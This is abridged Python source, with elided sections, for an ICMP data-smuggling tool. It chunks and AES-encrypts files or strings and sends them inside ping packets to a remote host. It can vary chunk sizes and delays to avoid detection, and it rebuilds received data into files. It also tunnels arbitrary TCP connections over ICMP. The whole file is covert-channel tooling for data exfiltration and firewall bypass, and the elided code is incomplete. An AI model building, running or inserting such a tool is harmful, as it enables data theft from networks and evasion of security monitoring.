...
customLogger = logging.getLogger("PSU");customLogger.setLevel(logging.DEBUG);consoleHandler = logging.StreamHandler();consoleHandler.setFormatter(psuLoggingFormatter());consoleHandler.setLevel(logging.INFO);customLogger.addHandler(consoleHandler)
class pingSmugglerUpgraded:
    ...
    class tunnelClient:
        ...
        def _encryptPayload(self,data):
            iv = os.urandom(16);cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend());encryptor = cipher.encryptor()
            return iv + (encryptor.update(data) + encryptor.finalize())
        def _decryptPayload(self,encPayload):
            try:
                iv = encPayload[:16];ciphertext = encPayload[16:];cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend());decryptor = cipher.decryptor()
                return decryptor.update(ciphertext) + decryptor.finalize()
            except Exception as E:
                self.psu.customLogPipe(f"Caught exception while attempting to decrypt a payload: '{str(E)}'.",level=3);return None
            ...
            try:
                while self.running:
                    try:
                        ...
                        threading.Thread(target=self._handleLocalClient, args=(connID,), daemon=True).start();synPacket = scapyIP(dst=self.rHost) / scapyICMP() / self._encryptPayload(struct.pack(self.psu.HEADER_FORMAT, connID, self.psu.FLAG_SYN));scapySend(synPacket, verbose=False)
                        self.psu.customLogPipe(f"Sent SYN for connection ID {connID}.")
                    except socket.timeout:
                        continue
            except KeyboardInterrupt: self.psu.customLogPipe("Local listener interrupted.")
        ...
        def _handleLocalClient(self,connID):
            ...
            try:
                ...
                finPacket = scapyIP(dst=self.rHost) / scapyICMP() / self._encryptPayload(struct.pack(self.psu.HEADER_FORMAT, connID, self.psu.FLAG_FIN));scapySend(finPacket, verbose=False);self.psu.customLogPipe(f"Sent FIN for connection {connID}.")
        def _listenICMP(self):
            def processICMPResponse(packet):
                if not packet.haslayer(scapyICMP) or not packet.haslayer(scapyIP): return
                try:
                    encPayload = bytes(packet[scapyICMP].payload);decPayload = self._decryptPayload(encPayload)
                    if not decPayload or len(decPayload) < self.psu.HEADER_SIZE:
                        return
                    connID, flags = struct.unpack(self.psu.HEADER_FORMAT, decPayload[:self.psu.HEADER_SIZE]);data = decPayload[self.psu.HEADER_SIZE:]
                    with self.lock:
        ...
        def start(self):
            ...
            try:
                ...
                self.psu.customLogPipe("Tunnel client stopped.");self.running = False
    class tunnelServe:
        ...
        def _forwardData(self,connID,data):
            ...
            header = struct.pack(self.psu.HEADER_FORMAT,connID,self.psu.FLAG_DATA);encPayload = self._encryptPayload(header+data);packet = scapyIP(dst=session['rAddr']) / scapyICMP() / encPayload;scapySend(packet,verbose=False)
        ...
        def _processPackets(self,packet):
            if not packet.haslayer(scapyICMP) or not packet.haslayer(scapyIP): return
            rAddr = packet[scapyIP].src;decPayload = self._decryptPayload(bytes(packet[scapyICMP].payload))
            ...
            with self.lock:
                if flags & self.psu.FLAG_SYN and connID not in self.sessions:
                    ...
                    try:
                        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.connect((self.rHost,self.rPort));self.sessions[connID]={"rAddr":rAddr,"sock":sock};threading.Thread(target=self._handleSock,args=(connID,),daemon=True).start()
                    except Exception as E:
                        self.psu.customLogPipe(f"Failed to connect to remote host '{str(self.rHost)}:{str(self.rPort)}' due to unknown exception: '{str(E)}'.",level=3);finPacket = scapyIP(dst=rAddr) / scapyICMP() / self._encryptPayload(struct.pack(self.psu.HEADER_FORMAT, connID, self.psu.FLAG_FIN));scapySend(finPacket, verbose=False)
                    ...
                    self.psu.customLogPipe(f"Closing tunnel connection (FIN) for ID '{connID}'.");self.sessions[connID]['sock'].close();del(self.sessions[connID])
        def start(self):
    ...
    class recv:
        def __init__(self, PSUI, key, base=None, outputFile=None, outputCap=None):
            self.psu = PSUI;self.key = key;self.base = base if base else os.getcwd();self.outputFile = outputFile;self.outputPCap = outputCap;self.pCount = 0;self.processedPackets = set();self.dataCompiled = b'';self.stop_event = threading.Event();self.sniffer_thread = None;self.lock = threading.Lock()
        ...
        def _decryptChunk(self, encData):
            try:
                if not encData or len(encData) < 16:
                    ...
                    return None
                iv = encData[:16];ciphertext = encData[16:];self.psu.customLogPipe(f"Decrypting chunk: IV length={len(iv)}, Ciphertext length={len(ciphertext)}", level=0);cipher = cryptCipher(cryptAlgo.AES(self.key), cryptModes.CBC(iv), backend=cryptDefaultBackend());decryptor = cipher.decryptor();padded = decryptor.update(ciphertext) + decryptor.finalize();unpadder = cryptPadding.PKCS7(128).unpadder();data = unpadder.update(padded) + unpadder.finalize();self.psu.customLogPipe(f"Successfully decrypted chunk: {len(data)} bytes", level=0)
                return data
            except Exception as E:
                self.psu.customLogPipe(f"Decryption failed: {str(E)}", level=3, exc_info=True);return None
        def _extractICMPPayload(self, packet):
            try:
                if not packet.haslayer(scapyICMP):
                    return None
                icmpLayer = packet[scapyICMP]
                if icmpLayer.payload is None or len(icmpLayer.payload) == 0:
                    self.psu.customLogPipe(f"ICMP payload is empty", level=0)
                    return None
                payloadData = bytes(icmpLayer.payload);self.psu.customLogPipe(f"Extracted ICMP payload: {len(payloadData)} bytes", level=0)
                return payloadData
            except Exception as E:
                self.psu.customLogPipe(f"Failed to extract ICMP payload: {str(E)}", level=3, exc_info=True);return None
        def _processPackets(self, packet):
            ...
            with self.lock:
                try:
                    if not packet.haslayer(scapyICMP):
                        return
                    srcIP = packet[scapyIP].src if packet.haslayer(scapyIP) else 'unknown'
                    destIP = packet[scapyIP].dst if packet.haslayer(scapyIP) else 'unknown'
                    self.psu.customLogPipe(f"Received ICMP packet from {srcIP} to {destIP}", level=1)
                    ...
                    if icmpData not in self.processedPackets:
                        ...
                        if decData:
                            self.pCount += 1;self.psu.customLogPipe(f"Decrypted chunk ({self.pCount}): {len(decData)} bytes", level=1);self.dataCompiled += decData
                            try:
                                decodedData = base64.b64decode(decData)
                                if self.outputFile:
                                    try:
                                        with open(self.outputPath, "ab") as f:
                                            f.write(decodedData)
                                            f.flush()
                                        self.psu.customLogPipe(f"Wrote {len(decodedData)} bytes to {self.outputPath}", level=0)
                                    except Exception as E:
                            ...
                            if self.outputPCap:
                                try:
                                    scapyWRPcap(self.pcapPath, packet, append=True);self.psu.customLogPipe(f"Saved packet to PCAP", level=0)
                                except Exception as E: self.psu.customLogPipe(f"Failed to save PCAP: {str(E)}", level=3)
                        else: self.psu.customLogPipe(f"Decryption returned None for packet", level=3)
                    else: self.psu.customLogPipe(f"Duplicate packet detected, skipping", level=0)
                except Exception as E: self.psu.customLogPipe(f"Error processing packet: {str(E)}", level=3, exc_info=True)
        def _sniffWorker(self, timeout=None, count=0):
            try:
                ...
                while not self.stop_event.is_set():
                    if timeout > 0 and (time.time() - startTime) >= timeout:
                        self.psu.customLogPipe(f"Capture timeout reached", level=1);break
                    if count > 0 and packetsCaptured >= count:
                        self.psu.customLogPipe(f"Capture count reached: {packetsCaptured}/{count}", level=1);break
                    try:
                        packets = scapySniff(filter="icmp", prn=self._processPackets, timeout=1, count=0, store=True);packetsCaptured += len(packets)
                    except KeyboardInterrupt:
                        self.stop_event.set();break
                    except Exception as E:
                        if not self.stop_event.is_set(): self.psu.customLogPipe(f"Sniff iteration error: {str(E)}", level=2)
            except Exception as E:
        ...
        def start(self, timeout=10, count=0):
            self.psu.customLogPipe(f"Starting packet capture (timeout={timeout}, count={count})", level=1);self.stop_event.clear();self.sniffer_thread = threading.Thread(target=self._sniffWorker, args=(timeout, count), daemon=False);self.sniffer_thread.start()
            try:
    ...
    class send:
        def __init__(self,PSUI:callable,rHost:str,key:str,filePath:str=None,data:str|bytes=None,chunkSize:int=32,delay:int=0,randomSize:bool=False,icmpType:int=8):
            self.psu = PSUI;self.rHost = rHost;self.key = key;self.filePath = filePath;self.data = data;self.chunkSize = chunkSize;self.delay = delay;self.randomSize = randomSize;self.icmpType = icmpType
        ...
        def _encryptChunk(self,chunk):
            padder = cryptPadding.PKCS7(128).padder();padded = padder.update(chunk)+padder.finalize();iv = os.urandom(16);cipher = cryptCipher(cryptAlgo.AES(self.key),cryptModes.CBC(iv),backend=cryptDefaultBackend());encryptor = cipher.encryptor();ciphertext = encryptor.update(padded)+encryptor.finalize()
    ...
    def _initParsers(self):
        self.customLogPipe("Attempting to initialize parsers (User-Interface Execution).", level='output');self.centralParser = argparse.ArgumentParser(description="An Evolved ICMP Data Smuggler.");self.subParCenteral = self.centralParser.add_subparsers(dest="mode",required=True,help="The desired mode of operation.");self.subParSend = self.subParCenteral.add_parser("send",help="Send data/files.");self.subParInputGroup = self.subParSend.add_mutually_exclusive_group(required=True);self.subParInputGroup.add_argument("-f","--file",dest="filePath",help="The path to the file to send.");self.subParInputGroup.add_argument("-d","--data",dest="dataStr",help="A string of data to send.");self.subParSend.add_argument("rHost",help="Destination Host(IP).");self.subParSend.add_argument("key",help='AES Key (16,24 or 32 bytes).');self.subParSend.add_argument("-cS","--chunk-size",type=int,default=32,help="The base size of data chunks in bytes (Default: 32).");self.subParSend.add_argument("--delay",type=float,default=0,help="Maximum random delay between packets in seconds (Default: 0).");self.subParSend.add_argument("-rS","--random-size",action="store_true",help="Use random chunk sizes up to `--chunk-size`.");self.subParSend.add_argument("-iS","--icmp-type",type=int,default=8,help="ICMP type to use (Default: 8, Echo Request).");self.subParRecv = self.subParCenteral.add_parser("recv",help="Recieve a file.");self.subParRecv.add_argument("key",help="AES Key (16, 24, or 32 bytes).");self.subParRecv.add_argument("outputFile",help="The output file.");self.subParRecv.add_argument("pcapOutput",help="The output PCAP file.");self.basePath = os.path.join(str(os.getcwd()),"PSUOut");self.subParRecv.add_argument("-b","--base",type=str,default=str(self.basePath),help=f"Base path for the output to stream to (Default: '{str(self.basePath)}').");self.subParListen = self.subParCenteral.add_parser("listen",help="Listen for tunneled TCP traffic.");self.subParListen.add_argument("key",help="AES Key (16, 24, or 32 bytes).");self.subParListen.add_argument("rHost",help="The real destination host to forward to.");self.subParListen.add_argument("rPort",type=int,help="The real destination port.");self.subParConnect = self.subParCenteral.add_parser("connect",help="Tunnel local TCP traffic over ICMP.");self.subParConnect.add_argument("key",help="AES Key (16, 24, or 32 bytes).");self.subParConnect.add_argument("rHost",help="The tunnel server (listening) host.");self.subParConnect.add_argument("lPort",type=int,help="The local port to listen on.");self.subParConnect.add_argument("rPort",type=int,help="The remote port on the target host.");self.subParGenKey = self.subParCenteral.add_parser("key-gen",help="Generate an AES key.");self.subParGenKey.add_argument("-s","--size",type=int,default=16,choices=[16,24,32],help="Key size in bytes (16, 24, or 32).");self.args = self.centralParser.parse_args()
        return True
